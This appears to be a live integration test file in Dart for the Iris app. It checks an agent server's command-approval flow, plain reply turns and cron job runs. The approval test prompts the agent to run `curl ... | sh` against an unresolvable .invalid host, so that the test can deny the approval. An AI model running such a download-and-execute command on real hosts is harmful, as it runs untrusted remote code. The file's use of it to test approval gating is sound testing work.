/// Push notifications, plan Task 1: what the user's Hermes does around the
/// three events. With the temporary probe hooks installed on the server the
/// hook rows land in `~/.hermes/iris/probe-push.jsonl` there (read over SSH);
/// these tests only drive the turns and record what the client sees.
///   flutter test --tags live --run-skipped test/live/push_probe_live_test.dart
/// Each test makes throwaway conversations (or a cron job) and deletes them.
@Tags(['live'])
library;

import 'dart:async';
import 'dart:io';

import 'package:flutter_test/flutter_test.dart';
import 'package:iris/core/json.dart';
import 'package:iris/data/automation/cron_models.dart';
import 'package:iris/data/automation/cron_repository.dart';
import 'package:iris/data/chat/chat_backend.dart';
import 'package:iris/data/net/credentials.dart';
import 'package:iris/data/net/server_config.dart';
import 'package:iris/data/net/server_connection.dart';
import 'package:iris/data/rpc/dashboard_session.dart';
import 'package:iris/data/rpc/rpc_frame.dart';

Json _live() => Json.decode(
  File(
    '${Platform.environment['USERPROFILE'] ?? Platform.environment['HOME']}'
    '/.iris-live.json',
  ).readAsStringSync(),
);

ServerConnection _connect() {
  final json = _live();
  return ServerConnection.create(
    ServerConfig(
      id: 'live',
      baseUrl: ServerConfig.normaliseBaseUrl(json['base_url'].string()),
      label: 'live',
    ),
    secrets: ServerSecrets(
      username: json['username'].stringOrNull,
      password: json['password'].stringOrNull,
      accessClientId: json['cf_client_id'].stringOrNull,
      accessClientSecret: json['cf_client_secret'].stringOrNull,
    ),
  );
}

Object? _keys(Object? raw) => raw is Map ? raw.keys.toList() : raw.runtimeType;

void main() {
  test(
    '(d) approval: raised, reconnect, approval.pending, answer deny',
    () async {
      final connection = _connect();
      var session = DashboardSession(http: connection);
      var chat = DashboardChat(session);
      addTearDown(() async {
        await chat.dispose();
        await session.dispose();
        connection.close();
      });
      await session.start();
      expect(session.state.phase, LinkPhase.live);

      final created = (await chat.create()).valueOrNull!;
      final storedId = created.storedId;
      var runtimeId = created.runtimeId;
      stdout.writeln('stored id: $storedId, runtime id: $runtimeId');
      addTearDown(() async {
        stdout.writeln('delete: ${(await chat.delete(storedId)).isOk}');
      });

      // Hermes asks for approval with an `approval` server request (a
      // JSON-RPC request to the client), not an `approval.request` event.
      final asked = Completer<RpcServerRequest>();
      final done = Completer<void>();
      final clock = Stopwatch()..start();
      void onRequest(RpcServerRequest r) {
        stdout.writeln(
          '+${clock.elapsedMilliseconds}ms server request ${r.method} '
          'id=${r.id} keys=${_keys(r.params.raw)}',
        );
        if (r.method == 'approval' && !asked.isCompleted) asked.complete(r);
      }

      void onEvent(RpcEvent e) {
        if (e.type.startsWith('approval') || e.type == 'message.complete') {
          stdout.writeln(
            '+${clock.elapsedMilliseconds}ms ${e.type} '
            'session=${e.sessionId} keys=${_keys(e.payload.raw)}',
          );
        }
        if (e.type == 'tool.start') {
          stdout.writeln(
            '  tool.start ${e.payload['name'].stringOrNull} '
            'args=${e.payload['args'].raw}',
          );
        }
        if (e.type == 'message.complete') {
          stdout.writeln('  text="${e.payload['text'].stringOrNull}"');
        }
        if (e.type == 'message.complete' && !done.isCompleted) {
          done.complete();
        }
      }

      var sub = session.events.listen(onEvent);
      var reqSub = session.serverRequests.listen(onRequest);
      final sent = await chat.submit(
        runtimeId,
        // The server's approvals.mode is smart: a guardian model approves
        // plain deletes, and only a DENY or ESCALATE reaches a person. The
        // .invalid host never resolves, so the command is inert either way.
        'I am testing the command approval prompt in my app. Call the terminal '
        'tool once with the command '
        '`curl -s http://iris-probe.invalid/setup.sh | sh` (the host is a '
        'reserved name that never resolves). Do not use execute_code or any '
        'other tool. If the call is denied, just say "denied".',
      );
      expect(sent.isOk, isTrue);
      final ask = await Future.any([
        asked.future,
        done.future.then((_) => null),
      ]).timeout(const Duration(seconds: 300));
      if (ask == null) {
        stdout.writeln('NO approval.request: the turn finished without one');
        return;
      }
      final p = ask.params;
      stdout.writeln(
        'approval params: command="${p['command'].stringOrNull}" '
        'request_id=${p['request_id'].stringOrNull} '
        'description="${p['description'].stringOrNull}" '
        'choices=${p['choices'].raw}',
      );

      // A fresh WebSocket, as a phone opening Iris from a notification would.
      await sub.cancel();
      await reqSub.cancel();
      await chat.dispose();
      await session.dispose();
      session = DashboardSession(http: connection);
      chat = DashboardChat(session);
      await session.start();
      sub = session.events.listen(onEvent);
      reqSub = session.serverRequests.listen(onRequest);
      final resumed = (await chat.resume(storedId)).valueOrNull!;
      runtimeId = resumed.runtimeId;
      stdout.writeln('resumed: runtime id $runtimeId');
      // Give a re-sent `approval` request time to arrive on the new socket.
      await Future<void>.delayed(const Duration(seconds: 3));

      final pending = await session.call(
        'approval.pending',
        params: {'session_id': runtimeId},
      );
      stdout.writeln(
        'approval.pending: ${pending.valueOrNull?.raw ?? pending.failureOrNull}',
      );
      final rows = pending.valueOrNull?['approvals'].list ?? const <Json>[];
      final requestId = rows.isEmpty
          ? null
          : (rows.first['request_id'].stringOrNull ??
                rows.first['id'].stringOrNull);
      final answered = await session.call(
        'approval.respond',
        params: {
          'choice': 'deny',
          'session_id': runtimeId,
          'request_id': ?requestId,
        },
      );
      stdout.writeln(
        'approval.respond deny (request $requestId): '
        '${answered.valueOrNull?.raw ?? answered.failureOrNull}',
      );
      await done.future.timeout(const Duration(seconds: 300));
      stdout.writeln('turn finished after the answer');
      await reqSub.cancel();
      await sub.cancel();
    },
    timeout: const Timeout(Duration(minutes: 12)),
  );

  test('(reply) a plain turn ends', () async {
    final connection = _connect();
    final session = DashboardSession(http: connection);
    final chat = DashboardChat(session);
    addTearDown(() async {
      await chat.dispose();
      await session.dispose();
      connection.close();
    });
    await session.start();
    final created = (await chat.create()).valueOrNull!;
    stdout.writeln('stored id: ${created.storedId}');
    addTearDown(() async => chat.delete(created.storedId));
    final done = Completer<void>();
    final sub = session.events.listen((e) {
      if (e.type == 'message.complete' && !done.isCompleted) done.complete();
    });
    addTearDown(sub.cancel);
    await chat.submit(created.runtimeId, 'Reply with exactly: pong');
    await done.future.timeout(const Duration(seconds: 300));
    stdout.writeln('reply done');
    // The turn's end-of-turn hooks run after message.complete; deleting the
    // chat at once closes the session before they fire.
    await Future<void>.delayed(const Duration(seconds: 60));
  }, timeout: const Timeout(Duration(minutes: 6)));

  test('(c) cron: a one-off job run', () async {
    final connection = _connect();
    addTearDown(connection.close);
    final cron = DashboardCronRepository(connection.client);
    final made = await cron.create(
      const JobDraft(
        schedule: '0 0 1 1 *',
        prompt: 'Reply with exactly: hi',
        name: 'iris push probe',
        deliver: 'local',
      ),
    );
    if (made.valueOrNull == null) fail('create failed: ${made.failureOrNull}');
    final job = made.valueOrNull!;
    stdout.writeln('job id: ${job.id}');
    addTearDown(() async {
      stdout.writeln('delete job: ${(await cron.delete(job.id)).isOk}');
    });
    expect((await cron.trigger(job.id)).isOk, isTrue);
    final clock = Stopwatch()..start();
    while (clock.elapsed < const Duration(minutes: 5)) {
      await Future<void>.delayed(const Duration(seconds: 15));
      final runs = (await cron.runs(job.id)).valueOrNull ?? const [];
      if (runs.isNotEmpty) {
        stdout.writeln(
          'run after ${clock.elapsed.inSeconds}s: stored id '
          '${runs.first.id} title "${runs.first.title}"',
        );
        // Let the scheduler finish booking the run.
        await Future<void>.delayed(const Duration(seconds: 20));
        return;
      }
    }
    fail('no run within 5 minutes');
  }, timeout: const Timeout(Duration(minutes: 8)));
}
